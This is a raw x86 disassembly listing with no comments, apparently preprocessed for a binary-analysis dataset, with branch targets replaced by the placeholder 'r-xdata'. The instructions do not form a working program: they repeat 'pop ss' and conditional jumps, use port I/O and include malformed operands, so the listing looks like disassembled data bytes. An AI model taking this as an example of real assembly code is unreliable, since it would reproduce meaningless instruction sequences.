xchg [ esi - 0x5aaf52d1 ] bh
movsd [ edi ] [ esi ]
mov al 0x8d
das
lodsd [ esi ]
push esp
xchg [ esi - 0x2cff5a5b ] bh
xor [ edi ] edx
pop ss
mov bh 0xb6
mov bl 0x6d
add [ esi + ecx ] esp
js r-xdata
call 0xffffffffccea7dbb
clc
in al dx
add ebx edx
sub ah ch
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
shl [ ecx ] 0x1
pop ss
pop ss
arpl [ ecx + ebp * 2 ] ax
pop ss
js r-xdata
insd
js r-xdata
lea esi [ eax + 0x14ad618e ]
call 0x124803fd
adc [ edi ] edx
pop ss
js r-xdata
fld [ eax ]
mov fs [ ecx - 0x53 ]
push ss
lodsd [ gs : esi ]
sbb [ ecx ] al
push esp
and al 0x17
pop ss
mov fs [ ecx - 0x6b ]
arpl [ cs : esi ] dx
mov fs [ ecx - 0x6b ]
and [ ecx ] al
sbb eax 0x7817172e
mov fs [ ecx - 0x4b ]
clc
popad
lodsd [ esi ]
js r-xdata
pop ss
pop ss
fld [ eax ]
mov cl 0xb1
popad
push cs
js r-xdata
insd
and edi esp
insb
js r-xdata
js r-xdata
add dl al
cmp edx [ edi ]
pop ss
insd
sub [ ecx ] al
imul esp esi 0x7878e8e8
js r-xdata
insb
out 0x32 al
pop ss
out 0x6c eax
pop ss
add [ edi ] ebp
xor dl [ edi ]
js r-xdata
call 0xbce8504
pop ss
pop ss
imul ebp [ eax ] 0xffffffea
add [ edi ] esi
or dl [ edi ]
add al 0xf8
in al dx
call 0x24ec199f
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
mov eax 0x1782f682
and [ gs : 0x57001717 ] dl
push edi
pop ss
pop ss
add [ eax ] ebx
or eax 0x6ce71717
out dx eax
call 0x20aa03bf
add [ ecx ] dl
and edx [ edi ]
pop ss
pop ss
pushfd
int3
add al 0x17
pop esp
in al dx
out 0x6c eax
js r-xdata
push edi
pop ss
pop ss
js r-xdata
rcl [ edi + 0x17 ] cl
inc eax
js r-xdata
add [ edi ] ecx
push edx
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
adc al 0xb9
mov eax 0x17537201
pop ss
lodsd [ gs : esi ]
xor al 0xb8
lodsd [ gs : esi ]
push 0x1707e701
js r-xdata
pop ss
pop ss
js r-xdata
add al 0x15
js r-xdata
cli
arpl [ edi ] si
mov fs [ ecx - 0x4b ]
lodsb [ esi ]
sbb [ edx - 0x4a9e714d ] 0xae
add [ edx + 0x78171703 ] ebp
js r-xdata
popad
xchg ebp eax
adc [ ecx ] al
xor [ edi ] dl
pop ss
js r-xdata
lodsd [ esi ]
adc al 0xb8
pop ss
aas
add [ eax - 0x47e8e8de ] edi
xor dh 0x82
pop ss
pop ss
js r-xdata
sbb dh [ eax + 0x618ec682 ]
lodsd [ esi ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
or [ ebp - 0x529e7150 ] 0x10
adc [ eax - 0x529e7150 ] 0x12
or [ ebp - 0x529e7150 ] 0x14
mov fs [ ecx - 0x53 ]
mov ch 0x10
js r-xdata
js r-xdata
pop ss
pushfd
int3
call 0xfffffffff8f17fd8
mov ebx 0x1739e001
pop ss
js r-xdata
js r-xdata
mov cl 0x1
js r-xdata
or eax 0x65781717
insd
dec eax
adc eax 0x30011717
das
sub al 0x1
pop ebp
call 0x78bf015b
js r-xdata
add al 0xe0
0x6d65e8e8 0x1510
add al 0x69
call 0xffffffff8cc900d1
add edx esp
adc eax 0x78781717
add [ esi + 0x618e2063 ] 0xa5
sbb [ ecx ] al
cld
out dx al
call 0xffffffffdd17a6e8
stc
out 0x6d eax
out 0xe8 al
call 0xffffffffea7083f2
mov gs [ ebx - 0x2c ]
stc
mov eax 0xbbb8bf17
pop ss
jg r-xdata
js r-xdata
popad
lodsd [ esi ]
insd
pop ss
js r-xdata
xor dl [ edi ]
pop ss
arpl [ ebp + 0x32dc00e4 ] di
pop ss
pop ss
mov ebp 0x32c4001c
pop ss
pop ss
pop ss
adc eax 0xd4001717
js r-xdata
popfd
loopne r-xdata
js r-xdata
add edx ecx
push ss
pop ss
pop ss
mov fs [ ecx - 0x53 ]
xor [ ebx + 0x29 ] ah
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
das
js r-xdata
call 0xffffffff805785c7
out 0x6a eax
inc ebx
in al dx
call 0xffffffffe75d87d0
insd
dec ebx
in al dx
lodsd [ esi ]
cmp al 0xb8
add ecx esi
aas
pop ss
pop ss
js r-xdata
push ebx
js r-xdata
salc
js r-xdata
and [ edi ] dl
add [ eax ] esi
js r-xdata
pop es
pop ss
pop ss
mov cl 0x21
sub edi [ eax + 0x78 ]
mov ch 0x14
popad
movsd [ edi ] [ esi ]
sbb al 0x61
mov ebp 0x14ad6310
popad
lodsd [ esi ]
or al 0x63
lodsd [ esi ]
adc [ ecx - 0x53 ] ah
add [ ebx - 0x53 ] ah
sbb al 0x61
lodsd [ esi ]
add al 0xdb
sub bl bl
cmp al [ ecx ]
imul esp [ 0x78781717 ] 0x78
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add ah dl
insd
pop ss
js r-xdata
add [ edi + edx ] dl
pop ss
add esi edx
xor [ edi ] dl
pop ss
imul edx [ ebp - 0x1fe171c ] 0x38
pop ss
pop ss
js r-xdata
insd
js r-xdata
sub bh ah
insb
pop ss
js r-xdata
js r-xdata
js r-xdata
sub bh ah
insb
sbb al 0x4
pop ss
pop ss
add [ ebx + 0x78781717 ] edx
js r-xdata
mov dh 0xb3
insd
call 0x2922032c
popad
mov ch 0x8
popad
mov ch 0x1c
mov ss bx
scasb [ edi ]
out dx al
out 0x6b eax
aaa
xor al 0x17
pop ss
add [ edi - 0x47e8e8f0 ] edi
sub dl 0x80
test [ ss : edi ] edi
dec ebx
pop ss
pop edi
and al 0xe8
call 0x4a11c52
pop ss
pop ss
out 0x6c eax
push cs
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
call 0x1c1285fa
pop ss
pop ss
mov gs [ ebx - 0x2e ]
call 0xffffffff8f304276
imul edx esp 0xfffffff9
xchg edi eax
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
add [ ebp - 0x53 ] ah
js r-xdata
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ esi + 0x6514ad61 ] cl
arpl [ ebx + ebp * 2 ] ax
add al 0xb0
add [ edx + 0x3f ] edx
pop ss
pop ss
js r-xdata
lodsd [ esi ]
sbb al 0xbb
pop ss
mov ebp 0x46d65f8
adc al 0x65
and edi esp
insb
or ebx [ 0x26001717 ]
aas
pop ss
pop ss
insd
sub [ ecx ] al
js r-xdata
mov eax 0x172fd501
pop ss
js r-xdata
stosb [ edi ]
add [ eax ] edx
out dx eax
call 0x61d494a5
clc
mov gs [ ebp + 0x3a ]
out 0x6c eax
bound esp [ ebx ]
pop ss
pop ss
add [ ebp + 0x5b ] ebp
pop ss
pop ss
sub ah 0x80
call 0x182f04ac
sahf
mov eax 0x687f17bb
call 0xffffffff9e5e04c7
mov eax 0xbb1cad61
lodsd [ gs : esi ]
dec esp
add esp edx
pop ss
pop ss
movsd [ edi ] gs : [ esi ]
pop esp
sub al 0x17
add esi edx
js r-xdata
pop ss
js r-xdata
js r-xdata
in al dx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
mov eax 0xe8e9ec80
call 0xffffffffe896969a
call 0x16e8670
push esp
das
pop ss
pop ss
js r-xdata
insb
loop r-xdata
jmp 0x60138b7d
js r-xdata
js r-xdata
push ebx
js r-xdata
inc eax
das
lodsd [ esi ]
add [ ebx + 0x2fa3a5be ] ah
lodsd [ gs : esi ]
mov ebp 0x175af501
arpl [ ebp + 0x14ad61e0 ] bp
add [ ebp + edx * 2 + 0x17 ] ebp
js r-xdata
js r-xdata
mov fs [ ecx - 0x6b ]
push ds
add [ ebx ] edx
push ds
pop ss
pop ss
or [ edx - 0x529e7150 ] 0x10
sbb [ ebx - 0x529e7150 ] 0x12
fld [ eax ]
mov fs [ ecx - 0x53 ]
js r-xdata
and al 0xe
js r-xdata
js r-xdata
call 0xffffffff94b3800a
js r-xdata
scasb [ edi ]
out dx al
out 0x6b eax
loop r-xdata
call 0xffffffff832f1214
jmp r-xdata
pop ss
mov al 0x8e
popad
lodsd [ esi ]
adc al 0xdb
sub [ esi + 0x116ad61 ] cl
mov esi esp
call 0x78be9205
out 0x7 eax
pop ss
out 0x5f eax
scasb [ edi ]
out dx al
pop ss
lodsd [ esi ]
sbb al 0x1
add eax 0x78171718
js r-xdata
call 0xffffffffc8dd8979
int 0x5f
pop ss
pop ss
imul edx [ edi + 0x6de7e9f4 ] 0x1e
jmp r-xdata
insd
js r-xdata
js r-xdata
out 0x6c eax
js r-xdata
pop ss
js r-xdata
mov edi 0xc8ae61
mov [ esi ] edi
movsd [ edi ] [ esi ]
mov [ 0x31de01be ] eax
pop ss
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov [ 0xffffffffbe04ad2f ] eax
js r-xdata
js r-xdata
mov bh 0xb6
add [ 0xffffffff80e8e8e0 ] ecx
cmp bh ch
js r-xdata
sub al 0xf0
insd
sub bh ah
insb
pop ss
add eax 0x17821717
mov eax 0xb401ea82
sub edx [ edi ]
pop ss
pop ss
js r-xdata
push ebp
pop ss
nop
0xc5201e8 0x1717
js r-xdata
add [ edi ] ecx
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
pop ss
js r-xdata
call 0x174ac0b4
pop ss
js r-xdata
push ss
add [ ecx + 0x78e8e8e6 ] ecx
js r-xdata
js r-xdata
jge r-xdata
js r-xdata
call 0xffffffffe10434ca
insd
push esp
adc dl [ edi ]
pop ss
mov eax 0x1c4be17
0x1707
out dx eax
push edi
or ah [ eax ]
pop ss
pop ss
insd
sub bh ah
insb
sub bl [ 0x4d011717 ]
sbb eax 0x2bb61717
adc eax 0x17173f
mov eax [ 0xffffffffb8be63d4 ]
add [ edi + 0x1c ] ebx
aas
sbb al 0x17
pop ss
add [ esi + 0x6317170c ] ah
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
lodsd [ esi ]
add al 0xbe
das
pop ss
js r-xdata
mov dl 0x82
or [ esi - 0x4dff429f ] 0x618e9a82
mov ebp 0x5d0e0102
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
add ebp esi
pop edx
pop ss
js r-xdata
sub al 0xe8
js r-xdata
pop ss
mov fs [ ecx - 0x4b ]
inc eax
mov bl 0x8e
popad
mov ch 0x42
add ebp edi
pop ds
pop ss
pop ss
pop ss
popfd
add [ edi ] dl
jg r-xdata
pop ss
mov eax 0x172a6401
out 0x6d eax
cmc
or edx [ edi ]
pop ss
add [ edi ] ebp
push edi
pop ss
pop ss
add [ eax ] 0xeb
call 0x747da7
jpe r-xdata
out 0xe8 al
call 0x78be9196
lodsd [ esi ]
adc al 0x1
pop ss
js r-xdata
mov eax 0x168ad65
add [ cs : edx + 0x7817171a ] esp
mov ss bx
imul edx [ ebx ] 0xffffffe1
add [ ecx + 0x7817171b ] edi
mov eax 0xe8e98d01
call 0xffffffff8e7481a9
popad
lodsd [ esi ]
arpl [ ecx ] dx
out 0x6c eax
std
call 0xffffffff94b2066d
popad
lodsd [ esi ]
sbb al 0xd3
das
add [ edi + ebp + 0x78781717 ] ebx
js r-xdata
js r-xdata
pop [ ecx ]
movaps [ edi ] xmm2
js r-xdata
arpl [ eax ] sp
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ edx - 0x529e7170 ] al
adc al 0x1
das
insd
mov bh [ edx ]
pop ss
pop ss
add [ edx + 0x1717172d ] ebp
popfd
sbb al 0x1
mov eax 0x78171703
js r-xdata
das
pop ss
pop ss
cmp [ edi - 0x5 ] 0xc9
push esi
mov edi 0xe0ae61
mov ebx 0x8017173e
adc [ edi + edx * 8 ] ah
mov eax [ 0xffffffffecae61bf ]
add [ ebp + 0x117173e ] ch
popad
scasb [ edi ]
enter 0x8900 0x3e
js r-xdata
add al 0xb0
add [ ecx + 0x17097e01 ] 0x17
js r-xdata
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
clc
call 0xffffffffe0c704b1
and [ ecx - 0x35 ] 0x17
pop edi
sub al 0xe8
call 0x2ac11a23
pop ss
pop ss
add ebp esp
jmp r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] si
imul ebp [ esp ] 0x6d
pop ss
pop ss
add eax edx
or edx [ edi ]
pop ss
add [ esp + edi ] dl
js r-xdata
js r-xdata
js r-xdata
lodsd [ esi ]
in al 0xe7
insb
push 0x25
pop ss
js r-xdata
lodsd [ esi ]
adc [ edi ] dl
mov edi 0x1286dbc
std
xor [ edi ] edx
pop ss
js r-xdata
cmp [ eax ] 0xe9
jmp 0xffffffffbb79faca
popad
mov ch 0xc
or [ edi + 0x17290f01 ] 0x17
pop ss
add [ 0xffffffffbe7e8b13 ] 0x1
add edx [ edi ]
pop ss
js r-xdata
js r-xdata
call 0xffffffffccda896e
cld
jmp 0xffffffffe9288a73
js r-xdata
sub ah 0xe9
js r-xdata
js r-xdata
js r-xdata
adc al 0x3c
js r-xdata
pop ss
js r-xdata
js r-xdata
arpl [ esi ] bp
add [ edi + 0xe ] cl
js r-xdata
push 0x61e8e8e8
outsb
sub al ch
call 0xffffffffe771f2d9
popad
lodsd [ esi ]
push es
mov al 0x82
lea esi [ ebx + 0x18ad618e ]
sbb [ edx + 0x12b63 ] 0xea
call 0x78be9855
js r-xdata
js r-xdata
pop ss
pop ss
or al 0x17
pop ss
arpl [ ebp - 0x2b5e9c20 ] sp
arpl [ esi + 0x1c5f01b8 ] di
and [ gs : 0xfffffffff0001717 ] dl
sub [ edi ] dl
insd
and [ 0x17b81717 ] dl
mov esi 0x6b21db8c
adc [ edi ] dl
out 0x7d eax
sub [ ebx + 0x11 ] esp
enter 0xe7e9 0x6d
imul edx [ esp + ecx * 8 + 0x6ce7e9fc ] 0xffffffe2
call 0xffffffff97b20678
js r-xdata
jmp 0x6dac0309
js r-xdata
adc [ ecx ] al
js r-xdata
js r-xdata
insb
popad
lodsd [ esi ]
adc al 0x1
imul edx [ esp + ecx * 8 + 0x6ae7fcf8 ] 0xffffff86
das
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
insd
pop ss
js r-xdata
js r-xdata
call 0x28b480d3
call 0x2c1a07d8
out 0x6d eax
js r-xdata
int3
add [ edi + 0x7817171a ] edi
arpl [ edi ] bp
call 0x15da8788
pop ss
and [ ebx ] ebp
js r-xdata
0x1716
insd
js r-xdata
pop ss
call 0x1fe0782
jo r-xdata
int3
js r-xdata
push esi
js r-xdata
js r-xdata
js r-xdata
pop ss
add [ ebp + 0x38 ] ebp
pop ss
pop ss
js r-xdata
[ edi ] dl
popad
mov ebp 0x618eb28a
mov ebp 0xfac018c
pop ss
pop ss
js r-xdata
adc eax 0x1b81717
sub dl [ fs : edi ]
js r-xdata
jb r-xdata
out 0x6c eax
js r-xdata
insd
sub esp edi
pop ss
pop ss
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
cld
out 0x6a eax
xchg [ edi ] ch
mov cl 0x82
pushfd
add [ eax ] ebp
add eax 0x28db1717
mov dl 0x38
mov esi 0x17106b8c
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
mov cl 0x6d
sub bh ah
insb
jmp r-xdata
add [ cs : edi + 0xe ] cl
in al 0x8
pop ss
pop ss
retn
out 0x6d eax
pop ss
call 0x5d4747d5
lea ecx [ esi - 0x4fc5529f ]
add [ esi + 0x17028801 ] 0x17
sub edx [ edi ]
sub [ ecx ] al
js r-xdata
cli
sub [ edi ] edx
js r-xdata
out 0x6d eax
imul edx [ eax ] 0x17
js r-xdata
mov ebx 0xae65ec82
js r-xdata
js r-xdata
fld [ eax ]
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
pop ebp
xor [ ebp + 0x17 ] ch
js r-xdata
pop ss
arpl [ eax ] dx
arpl [ esi ] bp
js r-xdata
pop ss
js r-xdata
fdivr [ eax + 0x6310ad63 ]
push 0xe8e8e84c
imul ebp [ eax ] 0xffffffe0
add [ ecx + 0x5c ] esp
pop ss
pop ss
imul edx [ ebp - 0x33fe17ec ] 0x38
pop ss
pop ss
js r-xdata
in al dx
js r-xdata
test al 0x1
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ eax + 0x78171737 ] ebx
js r-xdata
pop ss
js r-xdata
add ch bh
adc [ ebx + 0x2e ] ah
js r-xdata
test eax 0x8217175b
jmp 0xffffffffc812cde7
insd
js r-xdata
scasb [ edi ]
[ ecx + eax + 0x17173ed0 ] 0x78
call 0x7c480973
pop ss
salc
js r-xdata
aaa
pop ss
sub eax 0x2d011717
sub [ esi + 0x6502ad61 ] cl
js r-xdata
js r-xdata
scasb [ edi ]
js r-xdata
js r-xdata
cwde
aaa
js r-xdata
inc edi
add ch bh
js r-xdata
pop ebx
js r-xdata
or edx [ edi ]
insb
add [ edx - 0x15 ] ebp
js r-xdata
pop ss
pop ss
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
sub esp edi
insb
neg [ edi + edx ]
pop ss
arpl [ eax ] sp
add [ edx + eax ] edi
push esp
adc dl [ edi ]
pop ss
popad
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x44169e1c ] sp
add [ ebp - 0x14e8e8f8 ] edx
lodsd [ esi ]
loopne r-xdata
js r-xdata
pop ss
add dl [ edi ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
std
js r-xdata
pop ss
sub cl 0x65
lodsb [ esi ]
int3
call 0xffffffffc6c89a00
mov fs [ ecx - 0x53 ]
sbb [ ebx + 0xaad618e ] 0xb0
or dl 0x8e
popad
cmp bl bl
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
mov eax 0x171caf00
pop ss
imul ebp [ esp ] 0x17
sub [ eax + 0x170cd601 ] ch
js r-xdata
add ah [ ebp + 0x6d ]
js r-xdata
aaa
pop ss
pop ss
js r-xdata
mov dl 0x37
adc ah 0xe2
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ebp 0x18c82da
int3
pop ss
pop ss
js r-xdata
and ah 0x47
js r-xdata
xor esp [ ebp - 0x53 ]
cmp al 0x8e
popad
popfd
arpl [ es : ebp - 0x4a9e7120 ] bx
push eax
arpl [ edx ] si
mov eax 0x618e2e63
mov ch 0x54
mov fs [ ecx - 0x43 ]
sub [ ecx ] al
pop edx
cmp edx [ edi ]
pop ss
js r-xdata
js r-xdata
out 0x5f eax
scasb [ edi ]
cld
lodsb [ gs : esi ]
fdiv st0
sub [ ecx + eax + 0x17173ed0 ] 0x78
push 0xe7e8ec97
outsb
js r-xdata
js r-xdata
adc al [ ecx ]
add [ edi ] ebx
pop ss
pop ss
js r-xdata
call 0xffffffff8f0ca391
popad
lodsd [ esi ]
js r-xdata
or al 0x17
add esi edx
js r-xdata
insd
add al bl
sbb eax 0x9011717
in eax dx
call 0xffffffff86c89887
arpl [ eax ] sp
mov fs [ ecx - 0x5b ]
add [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
mov [ edx ] al
pop ss
pop ss
adc al 0x63
lodsd [ esi ]
adc al 0xd3
lodsd [ esi ]
adc bh ah
push 0x26
sub eax 0x2d011717
arpl [ ecx + eax ] ax
or bl ch
call 0x298a20b1
pop ss
pop ss
shr [ ebp + 0x6a6ce7e4 ] cl
and eax 0xad171717

arpl [ esi - 0x1d2b7f24 ] bp
js r-xdata
imul edx [ eax ] 0xffffffe9
out 0x6d eax
adc eax 0x117172a
sbb [ edx ] ebp
pop ss
pop ss
js r-xdata
js r-xdata
sub ebx [ ecx - 0x41 ]
inc edi
js r-xdata
sub [ ecx ] al
stc
popad
movsd [ edi ] [ esi ]
js r-xdata
add al 0x69
add al 0x8c
loop r-xdata
js r-xdata
mov eax 0x1708d101
pop ss
sub [ eax + 0x17092601 ] 0x17
add eax ecx
adc al 0x17
pop ss
js r-xdata
js r-xdata
fadd [ eax - 0x4f341d2c ]
add [ esi + 0x78171710 ] ebx
js r-xdata
js r-xdata
arpl [ ebx ] bp
add [ eax + 0x78171714 ] esp
js r-xdata
arpl [ esi ] bp
mov fs [ ecx - 0x53 ]
imul eax
out 0xe8 eax
add [ 0x17173f ] edx
pop ecx
mov edi 0x1f4ae61
loopne r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] dx
add [ edi + 0x78171700 ] edx
call 0x177e78aa
pop ss
js r-xdata
js r-xdata
push esi
js r-xdata
aam 0xe2
mov ebp 0x8010463
jmp r-xdata
mov dl 0x82
lahf
mov fs [ ecx - 0x43 ]
and al 0xb2
sbb [ edx + 0x172f6401 ] 0x17
js r-xdata
pop ss
pop ss
js r-xdata
popad
scasb [ edi ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
jg r-xdata
add [ edi + 0x6b17171c ] ch
sub al 0xe4
pop ss
fld [ eax ]
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
insd
dec ebx
add [ 0x7817172c ] edx
js r-xdata
mov fs [ ecx - 0x53 ]
and [ edi ] dl
pop ss
js r-xdata
fldenv [ eax ]
pop ss
hlt
js r-xdata
lodsd [ esi ]
or al 0x1
push 0xffffffeb
fwait
mov fs [ ecx - 0x53 ]
or dh [ eax + 0x618eca82 ]
xchg edi eax
in al dx
call 0x5c44908c
pop ss
pop ss
imul ecx [ esp + ecx * 8 - 0x539a1734 ] 0xffffffcc
int3
and [ ebx + 0x20 ] ah
fld [ eax ]
mov fs [ ecx - 0x4b ]
pop esi
mov fs [ ecx - 0x53 ]
mov fs [ ecx - 0x5b ]
push cs
fistp [ esi ]
mov esi 0x6da4bf17
sub ah 0x65
js r-xdata
clc
fld [ eax ]
add [ ebx - 0x14 ] edi
call 0x78be9b10
out 0x6d eax
stosb [ edi ]
sub edx [ edi ]
pop ss
fld [ eax ]
add [ ebx + 0x36 ] esi
pop ss
pop ss
out 0x6c eax
pushfd
xor edx [ edi ]
clc
lodsb [ gs : esi ]
int3
add [ ebp + 0x7817175d ] eax
js r-xdata
insd
js r-xdata
mov edi 0xf0ae61
push cs
cmp [ edi ] edx
pop ss
insb
int3
scasb [ edi ]
js r-xdata
out 0x6d eax
mov fs [ ecx - 0x53 ]
sbb dh [ eax + 0x1b69b82 ]
fdivr [ esi ]
pop ss
pop ss
js r-xdata
js r-xdata
adc ebp [ ebx + 0x2e ]
loopne r-xdata
mov ebp 0x6517172a
xchg ebp eax
out 0x6d eax
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ edx ] eax
adc eax 0x2f781717
lodsd [ esi ]
adc dl cl
enter 0xcdca 0x1
mov ebx 0x7817172e
js r-xdata
pop ss
sub bh ah
insd
call 0xd8c252c
js r-xdata
pop ss
mov bh 0xb6
insd
sub [ ecx ] al
inc ebp
xor dl [ edi ]
pop ss
add [ edi - 0x24 ] 0xb8
jpo r-xdata
pop ss
pushad
mov ah 0xfd
js r-xdata
popad
push esi
cmp al 0xe8
call 0x390b2471
pop ss
pop ss
sbb [ ebx ] 0x9c
lea edi [ ebx - 0x4f519e41 ]
add bh dh
cmp [ edi ] dl
pop ss
add [ edi ] edi
sub eax 0x78781717
js r-xdata
imul ebp [ eax + edi * 8 ] 0x1
lodsb [ esi ]
adc al 0x17
pop ss
test al 0xb8
js r-xdata
pop ss
pop ss
js r-xdata
pop ss
add [ esi + 0xd ] eax
js r-xdata
and [ ebp + 0x65 ] ah
pop eax
adc eax 0x1a001717
push eax
pop ss
pop ss
insd
sub [ ecx ] al
shr [ edx ] cl
pop ss
pop ss
pop ss
xchg ebp eax
mov cl 0x6d
sub [ ecx ] al
out 0x8 al
pop ss
pop ss
out 0x6c eax
or eax 0xe7171717
pop edi
stc
mov ebx 0xe8ea0301
call 0x23038397
in al 0xbb
js r-xdata
js r-xdata
lodsd [ esi ]
loopne r-xdata
sub [ edx ] 0x78781717
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
insb
int3
nop
sbb [ edi ] edx
insd
js r-xdata
movsd [ edi ] [ esi ]
in al 0x1
inc eax
inc esi
pop ss
pop ss
mov ebx 0xb401f282
add eax 0x286d1717
add [ ecx + 0x7817172a ] eax
sub dl 0x17
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ ecx ] 0xffffffea
imul ebp [ edx ] 0xffffffea
add eax esp
cmp [ edi ] edx
pop ss
js r-xdata
sub dl [ edi ]
popad
movsd [ edi ] [ esi ]
or al [ eax ]
hlt
mov eax [ 0x6d17171b ]
mov fs [ ebx - 0x55 ]
pop ss
pop ss
pop ss
mov eax 0xc6ab638e
mov esi 0x13063e4
adc [ ebx + 0x17 ] edx
pop ss
js r-xdata
pop ss
imul eax [ esp + eax * 2 ] 0xbee8e8ec
add edx ebp
das
pop ss
pop ss
mov fs [ ecx - 0x43 ]
jo r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x447e17af
call 0x2faa0dae
mov bh 0xb6
mov bl 0x6b
sub eax 0x782b219c
js r-xdata
fist [ edi ]
js r-xdata
sbb al [ edi ]
pop ss
pop ss
cmp al 0x65
pop ss
js r-xdata
popad
xchg ebp eax
jl r-xdata
out 0x5e eax
js r-xdata
mov esi 0xf4002f63
js r-xdata
pop ss
js r-xdata
mov ebp 0x173d9f01
pop ss
js r-xdata
pop ss
pop ss
mov eax 0xc8011f63
push esp
pop ss
pop ss
js r-xdata
add al 0x15
adc [ eax + 0x17058401 ] 0x17
js r-xdata
sub esp [ ecx - 0x53 ]
adc al 0xb8
pop ss
popfd
cld
arpl [ ebp + 0x192901e0 ] bp
pop ss
pop ss
js r-xdata
adc al bl
js r-xdata
js r-xdata
js r-xdata
aas
das
add ah dh
js r-xdata
adc dl [ edi ]
push ecx
fsubr st0
call 0xffffffffe9a9b24c
js r-xdata
lodsd [ esi ]
adc al 0x1
call 0x6d5e885e
js r-xdata
int3
add al 0xb9
mov ebx 0x199201be
pop ss
pop ss
js r-xdata
das
add [ ecx ] edi
push es
js r-xdata
call 0xffffffffaa470e73
js r-xdata
js r-xdata
hlt
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pushad
loopne r-xdata
push ds
arpl [ eax ] bx
sub [ ecx ] al
cmp eax [ ecx ]
pop ss
pop ss
js r-xdata
add [ ecx + 0x6d17171b ] ah
sub al 0x17
js r-xdata
pop ss
pop ss
js r-xdata
cmp [ esi ] eax
insd
add [ edi + edx ] dl
pop ss
mov eax 0x15046d65
arpl [ eax ] dx
add [ ecx + 0x6b171738 ] dh
sub al 0xf8
add [ esp + edx - 0x4757e8e9 ] ebp
imul ebp [ eax + edx * 8 ] 0x65
js r-xdata
pop ss
mov eax 0x11cad65
call 0x17a4cf8d
js r-xdata
mov gs bx
lodsb [ esi ]
or al 0x8e
popad
lodsd [ esi ]
push cs
add [ ebx ] esi
sub eax 0xac631717
int3
pop ss
pop ss
mov cl 0xb1
add ebx esp
sbb al 0x17
pop ss
js r-xdata
mov ebx 0x184700b8
pop ss
pop ss
imul ebp [ esp ] 0xffffffbb
int 0x59
js r-xdata
arpl [ ebx ] dx
mov fs [ ecx - 0x6b ]
sub [ ebx + 0x11 ] ah
mov fs [ ecx - 0x6b ]
sub al [ ecx ]
stosb [ edi ]
pop esi
pop ss
pop ss
js r-xdata
js r-xdata
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
test al 0xe4
lodsd [ esi ]
adc al 0x1
jb r-xdata
lodsd [ esi ]
pop eax
add [ ecx ] esi
or al 0x17
pop ss
js r-xdata
insd
call 0x18aa0d5d
jle r-xdata
pop ss
js r-xdata
pop es
pop ss
pop ss
fld [ eax ]
stc
out 0x5e eax
in al dx
out 0x1 al
sub esp [ edi ]
pop ss
pop ss
add [ esi + 0x6517175c ] ah
mov ebp 0x38f80034
pop ss
cmp [ eax - 0x4793529b ] bh
shl [ ebp - 0x53 ] 0x1
js r-xdata
pop esi
stosb [ edi ]
out 0x6c eax
pop ss
sub cl [ esi - 0x4f09529f ]
add dh 0xb6
or [ ebp - 0x37529e72 ] 0x1
stosb [ edi ]
pop ecx
mov esi 0x1c882be
sub [ edi ] edx
add eax ecx
or edx [ edi ]
pop ss
add [ edi + 0x6d171725 ] al
sub bh ah
insb
jl r-xdata
and [ ebx ] ebp
js r-xdata
pop ss
movsd [ edi ] gs : [ esi ]
js r-xdata
add [ eax + edx * 2 + 0x27c31717 ] eax
mov ss bx
sbb esp edi
insd
cmp ebx [ edx ]
pop ss
pop ss
add [ esi ] ecx
xor al 0x17
pop ss
js r-xdata
sbb [ ecx ] 0xf5
sub [ eax - 0x17d3a0e9 ] 0xaa00e8e8
js r-xdata
pop ss
pop ss
out 0x6c eax
leave
das
pop ss
pop ss
arpl [ ebp - 0x440f9e08 ] bp
push 0x63e8e8e8
sbb [ ebp + 0x1e ] ch
js r-xdata
js r-xdata
adc [ eax + 0x1ea5618e ] 0x63
and [ esi - 0x4eef5a9f ] cl
mov fs [ ecx - 0x5b ]
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + edi + 0x78781717 ] ebx
js r-xdata
call 0x1768cb85
js r-xdata
inc eax
add [ ebp + 0x286d1717 ] dh
out 0x6c eax
imul eax [ edi ] 0x28db1717
pop ss
push eax
movsd [ edi ] [ esi ]
js r-xdata
popad
lodsd [ esi ]
lodsd [ esi ]
loopne r-xdata
pop ss
call 0x5ef02674
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
mov ss [ eax - 0x17 ]
